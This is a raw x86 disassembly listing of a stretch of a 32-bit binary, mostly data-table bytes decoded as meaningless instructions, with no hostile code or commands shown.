  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    ah,dl
  412425:	cmp    DWORD PTR [ebx],eax
  412427:	add    ah,dl
  412429:	sub    DWORD PTR [ebx],eax
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
